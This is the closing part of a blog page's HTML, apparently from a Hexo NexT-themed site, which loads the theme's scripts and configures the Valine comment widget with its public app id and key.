  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '58W9BPsri2U8s70HBxhy6tS6-gzGzoHsz',
      appKey     : 'XsON9yD3oGzDCQskxtiPhGFj',
      placeholder: "ヾﾉ≧∀≦)o快来评论一下吧!",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
